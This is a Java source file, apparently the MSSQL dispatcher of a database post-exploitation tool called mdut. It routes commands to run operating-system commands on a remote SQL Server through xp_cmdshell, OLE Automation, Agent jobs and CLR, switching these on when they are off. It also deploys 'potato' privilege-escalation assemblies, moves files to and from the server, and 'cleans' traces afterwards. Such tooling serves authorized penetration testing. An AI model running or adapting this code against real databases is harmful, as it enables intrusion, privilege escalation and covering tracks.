package cli.dispatcher;

import cli.Args;
import cli.Ctx;
import cli.Result;
import Dao.MssqlDao;
import Util.Utils;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Map;

/**
 * MSSQL 分发：info / exec（xpcmdshell|oap|agent|clr；potato 系 M3a）/ sql / clean / recovery / deploy
 * + 文件五件套与 upload/download（spoa 路线；CLR 文件路线 M3a 补）。
 */
public class MssqlDispatcher extends BaseDispatcher {

    @Override
    public String dbType() {
        return "mssql";
    }

    @Override
    public Result handle(String tool, Args.Parsed p, Ctx ctx) throws Exception {
        String id = flag(p, "id", "");
        Map<String, String> rec = loadConn(ctx, id, dbType());
        String code = ctx.enc; // "" → Dao 内建 GB2312（现网兼容行为）
        MssqlDao dao = new MssqlDao(rec.get("ipaddress"), rec.get("port"), rec.get("database"),
                rec.get("username"), rec.get("password"), String.valueOf(ctx.timeoutSec));
        dao.setReporter(ctx.reporter);
        dao.getConnection();

        if ("sql".equals(tool)) {
            return Result.ok(dao.excute(p.positionals.get(0), code)).withId(id);
        }
        if ("info".equals(tool)) {
            String version = dao.getVersion();
            boolean dba = dao.queryIsDba();
            JSONObject d = new JSONObject();
            d.put("version", version == null ? "" : version.trim());
            d.put("is_dba", dba);
            return Result.ok("MSSQL " + (version == null ? "?" : version.trim())
                    + (dba ? " / DBA" : " / 非DBA"), d).withId(id);
        }
        if ("exec".equals(tool)) {
            String cmd = p.positionals.get(0);
            String method = flag(p, "method", "xpcmdshell");
            if ("xpcmdshell".equals(method)) {
                String res = dao.runcmdXPCS(cmd, code);
                if (res == null || res.isEmpty()) {
                    ctx.reporter.log("[mdut] xp_cmdshell 无回显，尝试自动激活后重试...");
                    dao.activateXPCS();
                    res = dao.runcmdXPCS(cmd, code);
                }
                return Result.ok(res == null ? "" : res).withId(id);
            }
            if ("oap".equals(method)) {
                String fname = "oares" + Utils.getRandomString();
                String res = dao.runcmdOAPBULK(cmd, fname, String.valueOf(ctx.timeoutSec), code);
                if (res == null || res.isEmpty()) {
                    ctx.reporter.log("[mdut] OAP 无回显，尝试自动激活后重试...");
                    dao.activateOAP();
                    res = dao.runcmdOAPBULK(cmd, fname, String.valueOf(ctx.timeoutSec), code);
                }
                return Result.ok(res == null ? "" : res).withId(id);
            }
            if ("agent".equals(method)) {
                String res = dao.runcmdagent(cmd, code);
                return Result.ok(res).withId(id);
            }
            if ("clr".equals(method)) {
                if (!dao.checkCLR()) {
                    ctx.reporter.log("[mdut] CLR 未部署，自动执行部署链（trustworthy→activate→init→create）...");
                    dao.setTrustworthy(rec.get("database"), "on");
                    dao.activateCLR();
                    dao.initCLR();
                    dao.createCLRFunc();
                }
                String res = dao.clrruncmd(cmd, "1", code);
                return Result.ok(res == null ? "" : res).withId(id);
            }
            if ("badpotato".equals(method) || "godpotato".equals(method) || "efspotato".equals(method)
                    || "efspotato_shellcode".equals(method) || "sweetpotato".equals(method)) {
                // D12 管道（与 Extend CLI 对齐）：kitmain CLR 链前置 → 部署对应程序集/过程 → exec kitX '<cmd>'
                if (!dao.checkCLR()) {
                    dao.setTrustworthy(rec.get("database"), "on");
                    dao.activateCLR();
                    dao.initCLR();
                    dao.createCLRFunc();
                }
                if (!dao.checkPotatoFunc(method)) {
                    if (!dao.createPotatoFunc(method)) {
                        return Result.target(method + " 部署失败（详见 stderr）",
                                "确认 sysadmin 权限与 CLR 可用；资产 Plugins/Mssql/" + MssqlDao.potatoAsset(method) + " 是否随包分发").withId(id);
                    }
                }
                String res = dao.runPotatoCmd(method, cmd, code);
                return Result.ok(res == null ? "" : res).withId(id);
            }
            return Result.usage("未知 --method: " + method,
                    "可用: xpcmdshell|oap|agent|clr|badpotato|godpotato|efspotato|efspotato_shellcode|sweetpotato").withId(id);
        }
        if ("clean".equals(tool)) {
            boolean ok = dao.clearHistory();
            return Result.ok(ok ? "clean 完成（xp_cmdshell/OAP/CLR 关闭，oashellresult 删除）" : "clean 部分失败（详见 stderr 日志）").withId(id);
        }
        if ("recovery".equals(tool)) {
            dao.recoveryAll();
            dao.closeAllPotato();
            return Result.ok("recovery 完成（组件一键恢复 + potato 系卸载）").withId(id);
        }
        if ("deploy".equals(tool)) {
            String comp = flag(p, "component", "clr");
            if (!"clr".equals(comp)) {
                return Result.usage("未知组件: " + comp, "当前支持: clr（potato 系组件随 exec --method 自动部署，M3a）").withId(id);
            }
            dao.setTrustworthy(rec.get("database"), "on");
            dao.activateCLR();
            dao.initCLR();
            dao.createCLRFunc();
            return Result.ok("CLR 部署链完成").withId(id);
        }
        if ("list-files".equals(tool)) {
            java.util.ArrayList<String> files = dao.getFiles(p.positionals.get(0));
            org.json.JSONArray arr = new org.json.JSONArray();
            for (String f : files) {
                String[] kv = f.split("\\|", 2);
                JSONObject o = new JSONObject();
                o.put("isfile", kv.length > 1 ? kv[0] : "");
                o.put("name", kv.length > 1 ? kv[1] : f);
                arr.put(o);
            }
            JSONObject d = new JSONObject();
            d.put("files", arr);
            return Result.ok(joinLines(files), d).withId(id);
        }
        if ("read".equals(tool)) {
            String res = dao.normalDownload(p.positionals.get(0));
            return textOrB64(res, code).withId(id);
        }
        if ("write".equals(tool)) {
            byte[] content = readContent(p);
            dao.normalUpload(p.positionals.get(0), Utils.bytes2HexString(content));
            return Result.ok("写入完成: " + p.positionals.get(0) + " (" + content.length + " bytes)").withId(id);
        }
        if ("upload".equals(tool)) {
            byte[] bytes = Utils.toByteArray(p.positionals.get(0));
            if (bytes == null) {
                return Result.usage("本地文件不可读: " + p.positionals.get(0), "检查路径与权限").withId(id);
            }
            dao.normalUpload(p.positionals.get(1), Utils.bytes2HexString(bytes));
            return Result.ok("上传完成: " + p.positionals.get(0) + " → " + p.positionals.get(1)
                    + " (" + bytes.length + " bytes)").withId(id);
        }
        if ("download".equals(tool)) {
            String res = dao.normalDownload(p.positionals.get(0));
            if (res == null) {
                return Result.target("下载失败: 远端内容为空", "检查路径/权限；或换 exec 通道").withId(id);
            }
            return toOut(ctx, res, null, flag(p, "out", "")).withId(id);
        }
        if ("rm".equals(tool)) {
            dao.normaldelete(p.positionals.get(0));
            return Result.ok("删除完成: " + p.positionals.get(0)).withId(id);
        }
        if ("mkdir".equals(tool)) {
            dao.normalmkdir(p.positionals.get(0));
            return Result.ok("目录创建完成: " + p.positionals.get(0)).withId(id);
        }
        return Result.usage("mssql 不支持命令: " + tool, "mdut --help 查看命令清单").withId(id);
    }

    // ---- 共用小件（与 Oracle 分发同语义） ----

    static String joinLines(java.util.List<String> lines) {
        StringBuilder sb = new StringBuilder();
        for (String l : lines) {
            sb.append(l).append('\n');
        }
        return sb.toString();
    }

    /** 小内容：text + data.b64；调用方保证内容非空 */
    static Result textOrB64(String content, String code) {
        if (content == null) {
            return Result.target("读取失败: 远端返回为空", "检查路径/权限");
        }
        JSONObject d = new JSONObject();
        if (content.length() <= 64 * 1024) {
            try {
                byte[] raw = code == null || code.isEmpty()
                        ? content.getBytes(StandardCharsets.ISO_8859_1)
                        : content.getBytes(code);
                d.put("b64", java.util.Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8)));
                d.put("size", raw.length);
            } catch (Exception e) {
                d.put("size", content.length());
            }
        } else {
            d.put("size", content.length());
            d.put("truncated", true);
            d.put("hint", "内容超过 64KB，请用 download --out 直存本地");
        }
        return Result.ok(content, d);
    }

    /** 二进制直存（mysql/pg 的 hex 通道用）：--out 直写本地；无 --out 时小内容 b64 进信封 */
    static Result toOutBytes(Ctx ctx, byte[] bytes, String outPath) throws Exception {
        JSONObject d = new JSONObject();
        if (outPath != null && !outPath.isEmpty()) {
            File out = new File(outPath);
            File parent = out.getAbsoluteFile().getParentFile();
            if (parent != null && !parent.isDirectory() && !parent.mkdirs()) {
                return Result.target("本地目录创建失败: " + parent, "检查 --out 路径");
            }
            FileOutputStream fos = new FileOutputStream(out);
            try {
                fos.write(bytes);
            } finally {
                fos.close();
            }
            d.put("out", out.getAbsolutePath());
            d.put("size", bytes.length);
            return Result.ok("已保存 " + out.getAbsolutePath() + " (" + bytes.length + " bytes)", d);
        }
        d.put("b64", java.util.Base64.getEncoder().encodeToString(bytes));
        d.put("size", bytes.length);
        return Result.ok(new String(bytes, java.nio.charset.StandardCharsets.UTF_8), d);
    }

    /** download 的 --out 直存（大文件纪律：内容不进信封） */
    static Result toOut(Ctx ctx, String content, byte[] rawBytes, String outPath) throws Exception {
        JSONObject d = new JSONObject();
        if (outPath != null && !outPath.isEmpty()) {
            byte[] bytes = rawBytes != null ? rawBytes : content.getBytes(StandardCharsets.UTF_8);
            File out = new File(outPath);
            File parent = out.getAbsoluteFile().getParentFile();
            if (parent != null && !parent.isDirectory() && !parent.mkdirs()) {
                return Result.target("本地目录创建失败: " + parent, "检查 --out 路径");
            }
            FileOutputStream fos = new FileOutputStream(out);
            try {
                fos.write(bytes);
            } finally {
                fos.close();
            }
            d.put("out", out.getAbsolutePath());
            d.put("size", bytes.length);
            return Result.ok("已保存 " + out.getAbsolutePath() + " (" + bytes.length + " bytes)", d);
        }
        return textOrB64(content, ctx.enc);
    }

    /** write 的内容来源：--stdin 或位置参数 */
    static byte[] readContent(Args.Parsed p) throws Exception {
        if ("true".equals(flagStatic(p, "stdin"))) {
            java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
            byte[] buf = new byte[8192];
            int n;
            while ((n = System.in.read(buf)) > 0) {
                bos.write(buf, 0, n);
            }
            return bos.toByteArray();
        }
        if (p.positionals.size() < 2) {
            throw new BaseDispatcher.UsageMsg("write 需要内容参数或 --stdin");
        }
        return p.positionals.get(1).getBytes(StandardCharsets.UTF_8);
    }

    private static String flagStatic(Args.Parsed p, String name) {
        String v = p.flags.get(name);
        return v == null ? "" : v;
    }
}
